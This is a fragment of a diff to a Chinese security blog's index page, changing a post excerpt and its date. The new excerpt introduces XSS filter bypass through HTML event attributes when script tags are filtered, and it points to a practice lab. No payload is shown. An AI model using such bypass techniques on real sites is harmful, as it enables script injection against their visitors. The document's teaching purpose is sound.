-                            什么是XSS？&emsp;通常指黑客通过“HTML 注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JavaScript的强
+                            
+当我们学会了打破网页结构之后，我们发现这个技巧有些情况并不适用。并不能成功的闭合标签，或者像&lt;script&gt;标签直接被过滤。这时候我们应该换一个思路,使用事件属性来突破。
+本篇靶场地址：https://tofu.exeye.r
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
                             </span>
                         <span class="publish-author">
                             
